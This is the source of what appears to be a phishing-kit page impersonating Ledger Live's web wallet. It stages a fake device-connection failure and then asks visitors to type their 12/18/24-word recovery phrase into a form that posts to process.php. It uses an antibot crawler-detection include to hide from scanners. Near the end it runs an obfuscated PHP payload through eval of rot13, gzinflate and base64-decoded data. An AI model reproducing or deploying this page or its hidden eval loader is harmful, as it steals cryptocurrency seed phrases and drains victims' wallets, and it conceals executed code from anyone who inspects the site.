<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>
  <link rel="shortcut icon" type=image/png href="./files/webwallet_files/wal.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ledger Live - Webwallet</title>
  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">


  <link href="./files/webwallet_files/css2" rel="stylesheet">
  <link rel="stylesheet" href="./files/webwallet_files/style.css">
  <link rel="stylesheet" href="./files/webwallet_files/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">

  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/webwallet_files/app.css">

  <link href="./files/webwallet_files/css2" rel="stylesheet">
</head>
<body>
<script>
function Function() {
  var txt;
  if (confirm("You need to connect a Ledger to continue.")) {
    window.location.href = "";
  } else {
   
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>

  <div class="content">
    <div class="left">
      <img src="./files/webwallet_files/ledger-logo.png" alt="" srcset="" style="width: 60%;
      margin: 0 auto;
      display: block; margin-top: 20px;">

      <p class="menu-item">MY DEVICES</p>

      <div class="side activated">
        <img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">
        <span>Add Wallet</span>
      </div>






      <p class="menu-item">MENU</p>

      <div onclick="Function()" class="side">
        <img src="./files/porto.PNG" alt="" height="22px" class="mr-2">
        <span>Portfolio</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/acc.PNG" alt="" height="22px" class="mr-2">
        <span>Accounts</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/send.PNG" alt="" height="22px" class="mr-2">
        <span>Send</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/rec.png" alt="" height="22px" class="mr-2">
        <span>Receive</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/man.png" alt="" height="22px" class="mr-2">
        <span>Manager</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/buy.png" alt="" height="22px" class="mr-2">
        <span>Buy Crypto</span>
      </div>

    </div>

    <div class="rigth">
      <h3><img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">Ledger Live</h3>
      <p style="font-size: 12px; color:#717171;">Manage crypto assets in Ledger securely from your browser. Advanced security for your cryptocurrency, made easy.</p>

      <div class="main" >
        <div class="timeline">
          <div class="line"></div>
          <div class="line-2"></div>
          <div class="line-3"></div>
          <div class="step active" data-count="1">
            <div class="cercle active-cercle">1</div>
            <p class="desc desc-active">Detection</p>
          </div>
          <div class="step" data-count="2">
            <div class="cercle">2</div>
            <p class="desc">Checking</p>
          </div>
          <div class="step" data-count="3">
            <div class="cercle">3</div>
            <p class="desc">Connect</p>
          </div>
        </div>

        <div id="step-1">
          <h4 class="mt-5 text-center">Select your device</h4>

          <div class="myCards">
            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanox.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
              <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanos.png" alt="" class="device">
              <p class="mt-2">Ledger Nano S</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/blue.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>
          </div>
        </div>



        <div id="step-2" class="step-2">
          <div class="video-device">
            <h5 class="text-center">Genuin check</h5>
			<p style="font-size: 12px; color:#717171;"> Connect your Ledger with this device to interact with Ledger Live.</p>


            <div id="connect-spinner">
              <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                  <span class="sr-only">Loading...</span>
                </div>
              </div>
              </div>

            <div class="connect text-center">
              <p style="color: rgb(182, 2, 2); font-size: 12px;">Ledger Live could not connect with your device. Check if your device is connected properly or recover your wallet.</p>

              <button id="use-phrase" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left; background-color: #6490f1; margin-bottom: 10px; color: white;">
                <img class="restorememe" style="margin-right: 20px" src="./files/webwallet_files/restore.png" alt="" srcset="" height="22px">
                Recover ledger with seed phrase
              </button>

              <button id="refresh" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left;">
              <img style="margin-right: 20px" src="./files/webwallet_files/refresh.png" alt="" srcset="" height="22px">
                Refresh
            </button>
            </div>
          </div>
        </div>



        <div id="step-3" class="step-3">
		<center>
<h4 style="
    margin-top: 10px;
    margin-bottom: 30px;
">Use your Recovery Phrase</h4>
		  <p style="font-size: 12px; color:#717171;">Enter your 12/18/24 words in a strict order. Do not rearrange them. </p>
        </center>
		  

          <form action="process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
            <div class="form-group">
              <textarea name="key" id="phrase" required="required" minlength="12" 
			  style="width: 100%; margin: 0 auto;" 
			  placeholder="Enter your Recovery phrase here" 
			  class="form-control" rows="3"></textarea>

            </div>
			
            <span class="disabled" id="message">Enter a space between each word.</span>
            <button id="recovme" style="width: 100%; margin: 0 auto; padding: 10px; background-color: #6490f1; color: white;display: block; border: none;"
			 form="form1" value="Import" type="submit" name="import" class="recover-finale" >
              Continue
            </button>
          </form>
		  
        </div>


        <div class="bottom">
          <div class="btn back" id="back">
            Back
          </div>

          <button class="btn continue" id="continue" disabled="">
            Continue
          </button>
        </div>

      </div>
      <br>
      <br>
      <br>
      <br>
      <br>
    </div>
  </div>

  <script src="./files/webwallet_files/jquery.min.js.download"></script>
  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
  <script src="./files/webwallet_files/popper.min.js.download"></script>
  <script src="./files/webwallet_files/bootstrap.min.js.download"></script>
  <script src="./files/webwallet_files/app.js.download"></script>
  <script src="./files/webwallet_files/phrase.js.download"></script>


</body></html>